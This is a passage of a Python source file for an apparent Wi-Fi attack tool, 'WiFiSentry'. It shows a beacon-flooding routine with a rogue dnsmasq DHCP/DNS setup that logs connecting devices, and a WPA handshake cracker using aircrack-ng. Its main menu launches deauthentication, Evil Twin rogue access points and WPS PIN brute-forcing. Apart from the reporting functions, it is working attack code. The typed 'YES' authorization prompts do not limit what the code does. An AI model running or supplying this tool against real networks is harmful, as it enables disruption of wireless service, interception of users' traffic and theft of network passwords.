    confirm = console.input(f"[bold red]Type 'YES' to confirm authorization (Session ID: {config['session_id']}): [/bold red]")
    if confirm != "YES":
        console.print("[bold red]Beacon flooding cancelled.[/bold red]")
        logging.info("Beacon flooding cancelled by user.")
        return False
    
    console.print("[yellow]Starting beacon flooding. Press Ctrl+C to stop...[/yellow]")
    logging.info("Starting beacon flooding")
    
    try:
        ssid_list = os.path.join(config["temp_dir"], "fake_ssids.txt")
        random_ssids = generate_random_ssids(50)
        with open(ssid_list, "w") as f:
            for ssid in random_ssids:
                f.write(f"{ssid}\n")
        
        dnsmasq_conf = f"""
interface={mon_interface}
dhcp-range=192.168.1.2,192.168.1.100,12h
address=/#/192.168.1.1
"""
        dnsmasq_file = os.path.join(config["temp_dir"], "dnsmasq.conf")
        dnsmasq_log = os.path.join(config["temp_dir"], "dnsmasq.log")
        with open(dnsmasq_file, "w") as f:
            f.write(dnsmasq_conf)
        
        subprocess.run(["ip", "link", "set", mon_interface, "up"], check=True)
        subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", mon_interface], check=True)
        dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", dnsmasq_file, "-l", dnsmasq_log], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        process = subprocess.Popen(
            ["mdk4", mon_interface, "b", "-f", ssid_list],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        ssid_count = len(random_ssids)
        broadcast_count = 0
        connected_clients = 0
        client_ips = []
        last_lines_processed = 0
        with Live(console=console, refresh_per_second=1) as live:
            while True:
                broadcast_count += ssid_count
                new_ips = []
                if os.path.exists(dnsmasq_log):
                    with open(dnsmasq_log, "r") as f:
                        lines = f.readlines()
                        for line in lines[last_lines_processed:]:
                            if "DHCPACK" in line:
                                match = re.search(r"DHCPACK\([^)]+\)\s+(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]+)", line)
                                if match:
                                    ip, mac = match.groups()
                                    new_ips.append(f"MAC: {mac}, IP: {ip}")
                                    console.print(f"[bold green]Client connected to fake SSID: MAC: {mac}, IP: {ip}[/bold green]")
                                    logging.info(f"Client connected to fake SSID: MAC: {mac}, IP: {ip}")
                        last_lines_processed = len(lines)
                        connected_clients = len(set(line for line in lines if "DHCPACK" in line))
                client_ips = new_ips[-5:]  # Show last 5 IPs to avoid clutter
                status = Text.assemble(
                    ("Broadcasting SSIDs: ", "cyan"), (f"{ssid_count}\n", "bold green"),
                    ("Total broadcasts: ", "cyan"), (f"{broadcast_count}\n", "bold green"),
                    ("Connected clients: ", "cyan"), (f"{connected_clients}\n", "bold green"),
                    *[(f"{ip}\n", "bold yellow") for ip in client_ips]
                )
                live.update(status)
                time.sleep(1)
    except KeyboardInterrupt:
        process.send_signal(signal.SIGINT)
        process.wait()
        dnsmasq_proc.terminate()
        subprocess.run(["ip", "addr", "flush", "dev", mon_interface], check=True)
        for f in [ssid_list, dnsmasq_file, dnsmasq_log]:
            if os.path.exists(f):
                os.remove(f)
        console.print(f"[bold green]Beacon flooding stopped: {broadcast_count} SSIDs broadcasted.[/bold green]")
        logging.info(f"Beacon flooding stopped: {broadcast_count} SSIDs broadcasted.")
        return True
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Beacon flooding failed: {e.stderr}[/bold red]")
        logging.error(f"Beacon flooding failed: {e.stderr}")
        return False

def crack_handshake(capture_path, essid, bssid):
    config = load_config()
    wordlist = config["wordlist_path"]
    if not os.path.exists(wordlist):
        console.print(f"[bold red]Wordlist {wordlist} not found.[/bold red]")
        wordlist = console.input("[cyan]Enter path to wordlist: [/cyan]")
        if not os.path.exists(wordlist):
            console.print("[bold red]Invalid wordlist path.[/bold red]")
            logging.error("Invalid wordlist path provided.")
            return None
    
    console.print(f"[yellow]Cracking handshake for {essid} using aircrack-ng...[/yellow]")
    logging.info(f"Cracking handshake for {essid} with {wordlist}")
    
    try:
        process = subprocess.Popen(
            ["aircrack-ng", "-w", wordlist, "-b", bssid, capture_path],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        with Progress(console=console) as progress:
            task = progress.add_task("[cyan]Cracking handshake", total=None)
            for line in process.stdout:
                progress.update(task, description=f"[cyan]{line.strip()}")
                if "KEY FOUND" in line:
                    key = re.search(r"KEY FOUND! \[ (.*?)\ ]", line)
                    if key:
                        console.print(f"[bold green]Password found: {key.group(1)}[/bold green]")
                        logging.info(f"Password found for {essid}: {key.group(1)}")
                        process.terminate()
                        return key.group(1)
        process.wait()
        console.print("[bold red]No password found.[/bold red]")
        logging.info(f"No password found for {essid}.")
        return None
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Aircrack-ng failed: {e.stderr}[/bold red]")
        logging.error(f"Aircrack-ng failed: {e.stderr}")
        return None

def save_capture(capture_path, report_file, essid):
    if not capture_path or not os.path.exists(capture_path):
        console.print("[bold red]No capture file to save.[/bold red]")
        return
    config = load_config()
    save = console.input("[cyan]Save capture file? (yes/no): [/cyan]")
    if save.lower() != "yes":
        try:
            os.remove(capture_path)
            if report_file and os.path.exists(report_file):
                os.remove(report_file)
            console.print("[bold green]Temporary files deleted.[/bold green]")
            logging.info("Temporary capture files deleted.")
        except OSError as e:
            console.print(f"[bold red]Error deleting temp files: {e}[/bold red]")
            logging.error(f"Temp file deletion failed: {e}")
        return
    
    default_name = f"handshake_{essid.replace(' ', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    filename = console.input(f"[cyan]Enter filename (or press Enter for default: {default_name}): [/cyan]")
    if not filename:
        filename = default_name
    
    save_dir = os.path.join(config["output_dir"], filename)
    if not os.path.exists(save_dir):
        os.makedirs(save_dir)
    
    new_capture_path = os.path.join(save_dir, f"{filename}.cap")
    new_report_path = os.path.join(save_dir, f"{filename}.txt")
    try:
        shutil.move(capture_path, new_capture_path)
        if report_file and os.path.exists(report_file):
            shutil.move(report_file, new_report_path)
        console.print(f"[bold green]Capture saved to {save_dir}[/bold green]")
        logging.info(f"Capture saved to {save_dir}")
    except OSError as e:
        console.print(f"[bold red]Error saving capture: {e}[/bold red]")
        logging.error(f"Capture save failed: {e}")

def generate_html_report(networks, clients, output_dir, attack_log, save_path):
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>WiFiSentry Penetration Test Report</title>
        <style>
            body {{ font-family: 'Arial', sans-serif; margin: 20px; background-color: #f4f4f9; color: #333; }}
            h1 {{ color: #2c3e50; text-align: center; font-size: 28px; }}
            h2 {{ color: #34495e; font-size: 22px; margin-top: 20px; }}
            table {{ border-collapse: collapse; width: 100%; margin: 20px 0; background-color: white; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }}
            th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; font-size: 14px; }}
            th {{ background-color: #2c3e50; color: white; cursor: pointer; }}
            tr:nth-child(even) {{ background-color: #f9f9f9; }}
            tr:hover {{ background-color: #e0e0e0; }}
            .critical {{ color: #e74c3c; font-weight: bold; }}
            .medium {{ color: #f1c40f; font-weight: bold; }}
            .low {{ color: #3498db; font-weight: bold; }}
            .enabled {{ color: #2ecc71; font-weight: bold; }}
            .disabled {{ color: #e74c3c; font-weight: bold; }}
            .log {{ margin-top: 20px; padding: 15px; background-color: white; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }}
            .log-item {{ margin-bottom: 10px; font-size: 14px; }}
            .sortable:hover {{ background-color: #34495e; }}
        </style>
        <script>
            function sortTable(n, tableId) {{
                var table, rows, switching = true, i, x, y, shouldSwitch, dir = "asc", switchcount = 0;
                table = document.getElementById(tableId);
                while (switching) {{
                    switching = false;
                    rows = table.rows;
                    for (i = 1; i < (rows.length - 1); i++) {{
                        shouldSwitch = false;
                        x = rows[i].getElementsByTagName("TD")[n];
                        y = rows[i + 1].getElementsByTagName("TD")[n];
                        if (dir == "asc") {{
                            if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {{
                                shouldSwitch = true; break;
                            }}
                        }} else if (dir == "desc") {{
                            if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {{
                                shouldSwitch = true; break;
                            }}
                        }}
                    }}
                    if (shouldSwitch) {{
                        rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
                        switching = true;
                        switchcount++;
                    }} else if (switchcount == 0 && dir == "asc") {{
                        dir = "desc"; switching = true;
                    }}
                }}
            }}
        </script>
    </head>
    <body>
        <h1>WiFiSentry Penetration Test Report</h1>
        <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><strong>Session ID:</strong> {DEFAULT_CONFIG['session_id']}</p>
        <h2>Networks ({len(networks)})</h2>
        <table id="networkTable">
            <tr>
                <th onclick="sortTable(0, 'networkTable')" class="sortable">BSSID</th>
                <th onclick="sortTable(1, 'networkTable')" class="sortable">ESSID</th>
                <th onclick="sortTable(2, 'networkTable')" class="sortable">Channel</th>
                <th onclick="sortTable(3, 'networkTable')" class="sortable">Encryption</th>
                <th onclick="sortTable(4, 'networkTable')" class="sortable">Auth</th>
                <th onclick="sortTable(5, 'networkTable')" class="sortable">Signal (dBm)</th>
                <th onclick="sortTable(6, 'networkTable')" class="sortable">WPS</th>
                <th onclick="sortTable(7, 'networkTable')" class="sortable">Vulnerabilities</th>
            </tr>
    """
    for n in networks:
        signal = int(n["Signal (dBm)"]) if n["Signal (dBm)"].strip() else -100
        vuln_class = "critical" if "Critical" in n["Vulnerabilities"] else "medium" if "Medium" in n["Vulnerabilities"] else "low" if "Low" in n["Vulnerabilities"] else ""
        wps_class = "enabled" if n["WPS"] == "Enabled" else "disabled"
        html_content += f"""
            <tr>
                <td>{n['BSSID']}</td>
                <td>{n['ESSID']}</td>
                <td>{n['Channel']}</td>
                <td>{n['Encryption']}</td>
                <td>{n['Auth']}</td>
                <td>{n['Signal (dBm)']}</td>
                <td class="{wps_class}">{n['WPS']}</td>
                <td class="{vuln_class}">{n['Vulnerabilities']}</td>
            </tr>
        """
    html_content += """
        </table>
        <h2>Clients (""" + str(len(clients)) + """)</h2>
        <table id="clientTable">
            <tr>
                <th onclick="sortTable(0, 'clientTable')" class="sortable">Client MAC</th>
                <th onclick="sortTable(1, 'clientTable')" class="sortable">Associated BSSID</th>
                <th onclick="sortTable(2, 'clientTable')" class="sortable">Signal (dBm)</th>
            </tr>
    """
    for c in clients:
        signal = int(c["Signal (dBm)"]) if c["Signal (dBm)"].strip() else -100
        html_content += f"""
            <tr>
                <td>{c['Client MAC']}</td>
                <td>{c['Associated BSSID']}</td>
                <td>{c['Signal (dBm)']}</td>
            </tr>
        """
    html_content += """
        </table>
        <h2>Attack Log</h2>
        <div class="log">
    """
    for event in attack_log:
        html_content += f"""
            <div class="log-item">
                <strong>{event['timestamp']}</strong>: {event['action']}
            </div>
        """
    html_content += """
        </div>
    </body>
    </html>
    """
    with open(save_path, "w") as f:
        f.write(html_content)
    console.print(f"[bold green]HTML report saved to {save_path}[/bold green]")
    logging.info(f"HTML report saved to {save_path}")

def save_session_outputs(networks, clients, output_dir, attack_log):
    save = console.input("[cyan]Save session outputs? (yes/no): [/cyan]")
    if save.lower() != "yes":
        cleanup_temp_files(DEFAULT_CONFIG["temp_dir"])
        console.print("[bold green]Temporary files deleted.[/bold green]")
        logging.info("Temporary files deleted.")
        return
    
    default_name = f"wifisentry_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    filename = console.input(f"[cyan]Enter filename (or press Enter for default: {default_name}): [/cyan]")
    if not filename:
        filename = default_name
    
    save_dir = os.path.join(output_dir, filename)
    if not os.path.exists(save_dir):
        os.makedirs(save_dir)
    
    for f in os.listdir(DEFAULT_CONFIG["temp_dir"]):
        try:
            shutil.move(os.path.join(DEFAULT_CONFIG["temp_dir"], f), os.path.join(save_dir, f))
        except OSError as e:
            console.print(f"[bold red]Error moving file {f}: {e}[/bold red]")
            logging.error(f"File move failed: {e}")
    
    summary_file = os.path.join(save_dir, f"{filename}.txt")
    json_file = os.path.join(save_dir, f"{filename}.json")
    html_file = os.path.join(save_dir, f"{filename}.html")
    
    summary = f"WiFiSentry Session Summary\n"
    summary += f"Session ID: {DEFAULT_CONFIG['session_id']}\n"
    summary += f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    summary += f"Networks Found: {len(networks)}\n"
    summary += f"Clients Found: {len(clients)}\n"
    if networks:
        summary += "\nNetworks:\n"
        for n in networks:
            summary += f"- {n['ESSID']} (BSSID: {n['BSSID']}, Channel: {n['Channel']}, Encryption: {n['Encryption']}, Auth: {n['Auth']}, Signal: {n['Signal (dBm)']} dBm, WPS: {n['WPS']}, Vulnerabilities: {n['Vulnerabilities']})\n"
    if clients:
        summary += "\nClients:\n"
        for c in clients:
            summary += f"- {c['Client MAC']} (Associated BSSID: {c['Associated BSSID']}, Signal: {c['Signal (dBm)']} dBm)\n"
    if attack_log:
        summary += "\nAttack Log:\n"
        for event in attack_log:
            summary += f"- {event['timestamp']}: {event['action']}\n"
    
    with open(summary_file, "w") as f:
        f.write(summary)
    json_data = {"networks": networks, "clients": clients, "attack_log": attack_log, "timestamp": datetime.now().isoformat(), "session_id": DEFAULT_CONFIG['session_id']}
    with open(json_file, "w") as f:
        json.dump(json_data, f, indent=4)
    generate_html_report(networks, clients, save_dir, attack_log, html_file)
    
    console.print(f"[bold green]Session outputs saved to {save_dir}[/bold green]")
    logging.info(f"Session outputs saved to {save_dir}")

def cleanup_temp_files(temp_dir):
    try:
        for f in os.listdir(temp_dir):
            os.remove(os.path.join(temp_dir, f))
        logging.info("Temporary files cleaned up.")
    except OSError as e:
        console.print(f"[bold red]Error cleaning up temp files: {e}[/bold red]")
        logging.error(f"Temp file cleanup failed: {e}")

def display_status(mon_interface, networks, clients):
    status = Panel(
        Text.assemble(
            ("Interface: ", "bold cyan"), (f"{mon_interface}\n", "bold green"),
            ("Mode: ", "bold cyan"), ("Monitor\n", "bold green"),
            ("Session ID: ", "bold cyan"), (f"{DEFAULT_CONFIG['session_id']}\n", "bold green"),
            ("Networks Found: ", "bold cyan"), (f"{len(networks)}\n", "bold green"),
            ("Clients Found: ", "bold cyan"), (f"{len(clients)}\n", "bold green"),
            ("Logs: ", "bold cyan"), (f"{log_dir}\n", "bold green"),
            ("Outputs: ", "bold cyan"), (f"{output_dir}", "bold green")
        ),
        title="Session Status",
        border_style="bold cyan"
    )
    console.print(status)

session_networks = []
session_clients = []
attack_log = []

def main_menu():
    console.print(Panel.fit("""
[bold cyan]
██╗    ██╗██╗███████╗██╗███████╗███████╗███╗   ██╗████████╗██████╗ ██╗   ██╗
██║    ██║██║██╔════╝██║██╔════╝██╔════╝████╗  ██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝
██║ █╗ ██║██║█████╗  ██║███████╗█████╗  ██╔██╗ ██║   ██║   ██████╔╝ ╚████╔╝ 
██║███╗██║██║██╔══╝  ██║╚════██║██╔══╝  ██║╚██╗██║   ██║   ██╔═══╝   ╚██╔╝  
╚███╔███╔╝██║██║     ██║███████║███████╗██║ ╚████║   ██║   ██║        ██║   
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝        ╚═╝   
[/bold cyan]
[bold green] Author : Ajay Bommidi [/bold green]
[bold red]For authorized penetration testing only.[/bold red]
[red]Ensure explicit permission to test target networks. Session ID: {DEFAULT_CONFIG['session_id']}[/red]
""", title="WiFiSentry - Advanced Wireless Security (v7.1)", border_style="bold magenta"))
    console.print("[bold cyan]Welcome to WiFiSentry! Select an option to begin.[/bold cyan]")
    logging.info("Tool initialized.")
    
    check_dependencies()
    interface, enabled_monitor = select_adapter()
    mon_interface = enable_monitor_mode(interface)
    if not mon_interface:
        console.print("[bold red]Exiting due to monitor mode failure.[/bold red]")
        logging.error("Exiting due to monitor mode failure.")
        sys.exit(1)

    while True:
        display_status(mon_interface, session_networks, session_clients)
        console.print(Panel.fit("[bold cyan]Main Menu[/bold cyan]", border_style="bold magenta"))
        console.print("[cyan]1. Scan for Wi-Fi networks[/cyan] - Discover nearby networks and clients")
        console.print("[cyan]2. Real-time network monitoring[/cyan] - Live network and client updates (Ctrl+C to stop)")
        console.print("[cyan]3. Capture packets for a network[/cyan] - Passive packet capture (Ctrl+C to stop or auto-stop on handshake)")
        console.print("[cyan]4. Capture handshake with deauthentication[/cyan] - Force handshake capture")
        console.print("[cyan]5. Deauthentication attack[/cyan] - Disconnect clients (Ctrl+C to stop or auto-stop on disconnect)")
        console.print("[cyan]6. Evil Twin attack[/cyan] - Create a rogue access point with realistic SSIDs")
        console.print("[cyan]7. WPS PIN brute-forcing[/cyan] - Exploit WPS vulnerabilities")
        console.print("[cyan]8. Beacon flooding[/cyan] - Flood airspace with realistic SSIDs (Ctrl+C to stop)")
        console.print("[cyan]9. Crack captured handshake[/cyan] - Attempt to recover WPA/WPA2 password")
        console.print("[cyan]10. Exit[/cyan] - Save session and exit")
        choice = console.input("[cyan]Enter your choice (1-10): [/cyan]")

        try:
            if choice == "1":
                attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": "Started network scan"})
                networks, clients = scan_networks(mon_interface)
                display_networks(networks, clients)
                session_networks.extend(networks)
                session_clients.extend(clients)
            elif choice == "2":
                attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": "Started real-time monitoring"})
                networks, clients = scan_networks(mon_interface, real_time=True)
                display_networks(networks, clients)
                session_networks.extend(networks)
                session_clients.extend(clients)
            elif choice == "3":
                attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": "Started packet capture"})
                networks, clients = scan_networks(mon_interface)
                display_networks(networks, clients)
                session_networks.extend(networks)
                session_clients.extend(clients)
                if networks:
                    bssid = console.input("[cyan]Enter the BSSID of the network to capture: [/cyan]")
                    network = next((n for n in networks if n["BSSID"].lower() == bssid.lower()), None)
                    if network:
                        console.print("[bold red]WARNING: Ensure explicit permission to test this network.[/bold red]")
                        confirm = console.input(f"[bold red]Type 'YES' to confirm authorization (Session ID: {DEFAULT_CONFIG['session_id']}): [/bold red]")
                        if confirm == "YES":
                            logging.info(f"User confirmed authorization for {network['ESSID']} (Session ID: {DEFAULT_CONFIG['session_id']})")
                            attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": f"Captured packets for {network['ESSID']}"})
                            handshake, capture_path, report_file = capture_packets(mon_interface, network["BSSID"], network["Channel"], network["ESSID"])
                            save_capture(capture_path, report_file, network["ESSID"])
                            if handshake:
                                crack = console.input("[cyan]Attempt to crack handshake now? (yes/no): [/cyan]")
                                if crack.lower() == "yes":
                                    attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": f"Cracked handshake for {network['ESSID']}"})
                                    crack_handshake(capture_path, network["ESSID"], network["BSSID"])
                        else:
                            console.print("[bold red]Operation cancelled.[/bold red]")
                            logging.info("Packet capture cancelled by user.")
                    else:
                        console.print("[bold red]Invalid BSSID.[/bold red]")
                        logging.error("Invalid BSSID entered.")
            elif choice == "4":
                attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": "Started handshake capture with deauth"})
                networks, clients = scan_networks(mon_interface)
                display_networks(networks, clients)
                session_networks.extend(networks)
                session_clients.extend(clients)
                if networks:
                    bssid = console.input("[cyan]Enter the BSSID of the network to capture: [/cyan]")
                    network = next((n for n in networks if n["BSSID"].lower() == bssid.lower()), None)
                    if network:
                        client_mac = None
                        if clients:
                            client_macs = [c["Client MAC"] for c in clients if c["Associated BSSID"].lower() == bssid.lower()]
                            if client_macs:
                                console.print("[cyan]Available clients:[/cyan]")
                                for i, mac in enumerate(client_macs, 1):
                                    console.print(f"[cyan]{i}. {mac}[/cyan]")
                                choice = console.input("[cyan]Enter client number to target (or press Enter for all): [/cyan]")
                                if choice and choice.isdigit() and 1 <= int(choice) <= len(client_macs):
                                    client_mac = client_macs[int(choice) - 1]
                        
                        config = load_config()
                        deauth_count = 5
                        for attempt in range(config["auto_deauth_retries"]):
                            handshake, capture_path, report_file = capture_packets(
                                mon_interface, network["BSSID"], network["Channel"], network["ESSID"],
                                deauth=True, client_mac=client_mac, deauth_count=deauth_count
                            )
                            if handshake:
                                console.print("[bold green]Handshake captured successfully![/bold green]")
                                save_capture(capture_path, report_file, network["ESSID"])
                                crack = console.input("[cyan]Attempt to crack handshake now? (yes/no): [/cyan]")
                                if crack.lower() == "yes":
                                    attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": f"Cracked handshake for {network['ESSID']}"})
                                    crack_handshake(capture_path, network["ESSID"], network["BSSID"])
                                break
                            else:
                                console.print("[bold red]No handshake captured.[/bold red]")
                                if attempt < config["auto_deauth_retries"] - 1:
                                    retry = console.input("[cyan]Retry with increased deauth attempts? (yes/no): [/cyan]")
                                    if retry.lower() != "yes":
                                        save_capture(capture_path, report_file, network["ESSID"])
                                        break
                                    deauth_count += 5
                                    console.print(f"[yellow]Retrying with {deauth_count} deauth packets...[/yellow]")
                                else:
                                    console.print("[bold red]Max retries reached. No handshake captured.[/bold red]")
                                    save_capture(capture_path, report_file, network["ESSID"])
                    else:
                        console.print("[bold red]Invalid BSSID.[/bold red]")
                        logging.error("Invalid BSSID entered.")
            elif choice == "5":
                attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": "Started deauthentication attack"})
                networks, clients = scan_networks(mon_interface)
                display_networks(networks, clients)
                session_networks.extend(networks)
                session_clients.extend(clients)
                if networks:
                    bssid = console.input("[cyan]Enter the BSSID of the network to attack: [/cyan]")
                    network = next((n for n in networks if n["BSSID"].lower() == bssid.lower()), None)
                    if network:
                        client_mac = None
                        if clients:
                            client_macs = [c["Client MAC"] for c in clients if c["Associated BSSID"].lower() == bssid.lower()]
                            if client_macs:
                                console.print("[cyan]Available clients:[/cyan]")
                                for i, mac in enumerate(client_macs, 1):
                                    console.print(f"[cyan]{i}. {mac}[/cyan]")
                                choice = console.input("[cyan]Enter client number to target (or press Enter for all): [/cyan]")
                                if choice and choice.isdigit() and 1 <= int(choice) <= len(client_macs):
                                    client_mac = client_macs[int(choice) - 1]
                        deauth_attack(mon_interface, network["BSSID"], client_mac)
                    else:
                        console.print("[bold red]Invalid BSSID.[/bold red]")
                        logging.error("Invalid BSSID entered.")
            elif choice == "6":
                attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": "Started Evil Twin attack"})
                networks, clients = scan_networks(mon_interface)
                display_networks(networks, clients)
                session_networks.extend(networks)
                session_clients.extend(clients)
                if networks:
                    bssid = console.input("[cyan]Enter the BSSID of the network to mimic (or press Enter for random SSID): [/cyan]")
                    if bssid:
                        network = next((n for n in networks if n["BSSID"].lower() == bssid.lower()), None)
                        if network:
                            evil_twin(mon_interface, network["ESSID"], network["Channel"])
                        else:
                            console.print("[bold red]Invalid BSSID.[/bold red]")
                            logging.error("Invalid BSSID entered.")
                    else:
                        evil_twin(mon_interface)
            elif choice == "7":
                attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": "Started WPS brute-forcing"})
                networks, clients = scan_networks(mon_interface)
                display_networks(networks, clients)
                session_networks.extend(networks)
                session_clients.extend(clients)
                if networks:
                    bssid = console.input("[cyan]Enter the BSSID of the network to attack: [/cyan]")
                    network = next((n for n in networks if n["BSSID"].lower() == bssid.lower()), None)
                    if network:
                        if network["WPS"] == "Enabled":
                            wps_bruteforce(mon_interface, network["BSSID"], network["ESSID"])
                        else:
                            console.print("[bold red]WPS is not enabled on this network.[/bold red]")
                            logging.error(f"WPS brute-forcing attempted on non-WPS network: {network['ESSID']}")
                    else:
                        console.print("[bold red]Invalid BSSID.[/bold red]")
                        logging.error("Invalid BSSID entered.")
            elif choice == "8":
                attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": "Started beacon flooding"})
                beacon_flood(mon_interface)
            elif choice == "9":
                attack_log.append({"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "action": "Started handshake cracking"})
                capture_path = console.input("[cyan]Enter path to captured .cap file: [/cyan]")
                essid = console.input("[cyan]Enter ESSID of the network: [/cyan]")
                bssid = console.input("[cyan]Enter BSSID of the network: [/cyan]")
                if os.path.exists(capture_path):
                    console.print("[bold red]WARNING: Ensure permission to crack this handshake.[/bold red]")
                    confirm = console.input(f"[bold red]Type 'YES' to confirm authorization (Session ID: {DEFAULT_CONFIG['session_id']}): [/bold red]")
                    if confirm == "YES":
                        logging.info(f"User confirmed authorization for cracking {essid} (Session ID: {DEFAULT_CONFIG['session_id']})")
                        crack_handshake(capture_path, essid, bssid)
                    else:
                        console.print("[bold red]Cracking cancelled.[/bold red]")
                        logging.info("Handshake cracking cancelled by user.")
                else:
                    console.print("[bold red]Capture file not found.[/bold red]")
                    logging.error("Capture file not found.")
            elif choice == "10":
                console.print("[bold yellow]Saving session and exiting...[/bold yellow]")
                save_session_outputs(session_networks, session_clients, DEFAULT_CONFIG["output_dir"], attack_log)
                disable_monitor_mode(mon_interface)
                console.print("[bold green]WiFiSentry session ended. Goodbye![/bold green]")
                logging.info("Session ended.")
                sys.exit(0)
            else:
                console.print("[bold red]Invalid choice. Please select 1-10.[/bold red]")
                logging.warning(f"Invalid menu choice: {choice}")
        except KeyboardInterrupt:
            console.print("[bold yellow]Operation interrupted by user.[/bold yellow]")
            logging.info("Operation interrupted by user.")
        except Exception as e:
            console.print(f"[bold red]Unexpected error: {e}[/bold red]")
            logging.error(f"Unexpected error: {e}", exc_info=True)

if __name__ == "__main__":
    main_menu()